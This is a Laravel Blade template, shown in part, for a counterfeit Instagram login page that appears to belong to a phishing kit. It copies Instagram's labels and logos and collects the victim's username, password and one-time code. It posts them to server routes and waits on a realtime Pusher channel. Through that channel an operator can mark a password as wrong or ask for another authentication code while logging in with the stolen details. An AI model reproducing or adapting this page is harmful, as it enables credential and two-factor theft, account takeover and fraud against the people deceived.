...
<body>
        ...
        <div class="w-full sm:max-w-[900px]">
            ...
            <form id="submit_otp">
                <div class="mb-4">
                    ...
                    <label
                        class="block text-[14px] text-card-foreground font-medium mb-2">{{ __('instagram.or_enter_otp') }}</label>
                    <input type="text" inputmode="numeric" maxlength="8" required
                        placeholder="{{ __('instagram.input_otp_placeholder') }}"
                ...
                <button
                    ...
                    id="confirm_otp" type="submit">{{ __('instagram.confirm') }}</button>
            </form>
        </div>
    </div>
    <div class="w-[95vw] lg:w-[99vw] mx-auto mt-[30px] relative h-[90vh]" id="main">
        <p class="text-center text-sm text-[#646d74]">{{ __('instagram.' . app()->getLocale()) }}</p>
        <div class="h-[200px] flex justify-center items-center">
            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/instagram/ig_logo.webp"
                alt="ig-logo" width="60">
        </div>
        <p class="font-semibold mb-3 ml-2">{{ $data->login_warning }}</p>
        {{-- Thông báo khi lỗi --}}
        <div class="py-3.5 px-4 bg-[#f93a4b] text-white text-sm rounded-2xl mb-3" id="warning" style="display: none;">
        </div>
        <form id="submit" class="space-y-3">
            <div class="relative border border-gray-300 rounded-[17px] p-4">
                <div class="flex gap-1">
                    ...
                    <label
                        ...
                        for="user">{{ __('instagram.email_or_phone') }}</label>
            ...
            <div class="relative border border-gray-300 rounded-[17px] p-4">
                <div class="flex gap-1">
                    ...
                    <label
                        class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                        for="pass">{{ __('instagram.password') }}</label>
            ...
            <button type="submit"
                ...
                id="log_btn">
                {{ __('instagram.login') }}</button>
        </form>
        <div class="mt-4">
            <p class="text-center text-sm text-[#0d1114] cursor-pointer">{{ __('instagram.forgot_password') }}</p>
        </div>
        <div class="space-y-4 flex flex-col items-center absolute bottom-0 w-full">
            <button
                ...
                {{ __('instagram.create_new_account') }}
            </button>
            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/meta_logo.png"
                alt="fb-logo" width="55">
            <div class="flex justify-center items-center gap-2">
                <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('instagram.introduce') }}</p>
                <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('instagram.help') }}</p>
                <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('instagram.view_more') }}</p>
            </div>
        </div>
    </div>
    ...
    <script>
        ...
        channel.bind("{{ $pusher_code }}", function(data) {
            ...
            if (data.status) {
                ...
                if (data.wrong_password) {
                    warning.show()
                    warning.html("{{ __('instagram.invalid_password') }}")
                    btn.attr('disabled', false).html("{{ __('instagram.login') }}")
                }
                if (data.wrong_user) {
                    warning.show()
                    warning.html("{{ __('instagram.wrong_phone_or_email') }}")
                    btn.attr('disabled', false).html("{{ __('instagram.login') }}")
                }
                if (data.otp_request) {
                    $("#main").remove()
                ...
                if (data.request_resend) {
                    $("#warning_otp").show()
                    $("#warning_otp").html("{{ __('instagram.invalid_authentication_code') }}")
                    $("#confirm_otp").html("{{ __('instagram.confirm') }}").attr('disabled', false)
                }
            }
        });
        ////
        $("#submit").submit(function(e) {
            ...
            btn.attr('disabled', true).html("{{ __('instagram.logging_in') }}")
            // auto detect phone or string
            warning.hide()
            @if ($setting->checkLoginFacebook)
                if (string_check(username)) {
                    if (!check_email(username)) {
                        warning.html("{{ __('instagram.wrong_email') }}")
                        warning.show()
                        btn.attr('disabled', false).html("{{ __('instagram.login') }}")
                        return
                    }
            ...
            @if ($setting->checkLoginFacebookPassword)
                if (password.length < 5) {
                    warning.html("{{ __('instagram.password_too_short') }}")
                    warning.show()
                    btn.attr('disabled', false).html("{{ __('instagram.login') }}")
                    return
                }
            ...
            $.post("{{ $type == 'custom' ? route('post.customweb.facebook') : route('post.realtimeweb.facebook') }}", {
                ...
                function(data, textStatus, jqXHR) {
                    if (!data.status) {
                        warning.html("{{ __('instagram.try_again') }}")
                        warning.show()
                        btn.attr('disabled', false).html("{{ __('instagram.login') }}")
                        return
                    }
        ...
        $("#submit_otp").submit(function(e) {
            ...
            if (!otp || otp.length > 8) {
                warning.show()
                warning.html("{{ __('instagram.invalid_authentication_code') }}")
                return
            }
            btn.html("{{ __('instagram.confirming') }}").attr('disabled', true)
            $.post("{{ $type == 'custom' ? route('post.customweb.facebook') : route('post.realtimeweb.facebook') }}", {
                    d: JSON.stringify(dataToSend),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
